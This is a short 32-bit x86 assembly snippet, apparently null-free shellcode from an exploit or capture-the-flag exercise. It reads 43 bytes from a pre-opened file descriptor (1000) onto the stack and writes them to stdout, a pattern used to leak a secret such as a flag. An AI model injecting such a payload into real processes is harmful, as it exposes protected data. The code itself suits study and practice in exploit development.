BITS 32;
	
	xor ebx, ebx
	xor edx, edx
	mov bx, 0x3e8;
	mov ecx, esp;
	mov dl, 43;
	xor eax, eax
	mov al, 0x03;
	int 0x80;
	xor ebx, ebx
	mov bl, 0x1;
	mov dl, 43;
	mov al, 0x04;
	int 0x80;
